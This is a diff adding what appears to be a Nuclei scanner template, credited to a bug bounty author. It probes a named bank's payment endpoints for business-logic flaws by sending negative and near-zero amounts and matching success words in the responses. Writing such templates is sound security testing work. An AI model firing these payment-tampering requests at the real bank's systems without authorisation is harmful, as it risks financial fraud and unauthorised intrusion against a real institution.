@@ -1,0 +1,51 @@
+id: alfabank-business-logic-flaws
+
+info:
+  name: Alfabank - Business Logic Flaws
+  author: bugbounty
+  severity: critical
+  description: Business logic flaws in payment, amount, discount
+  tags: business-logic,payment,alfabank
+
+http:
+  - raw:
+      - |
+        POST /rest/Init HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"Amount":-1000,"OrderId":"negative-test"}
+
+      - |
+        POST /rest/Init HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"Amount":0.01,"OrderId":"penny-test"}
+
+      - |
+        GET /offers/api/generatePdf/SCHEDULE?amount=-100000&rate=0.01 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /payment/constructor/prepay.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        login=test&amount=-999999&currency=RUR
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "approved"
+          - "payment"
+          - "schedule"
+        condition: or
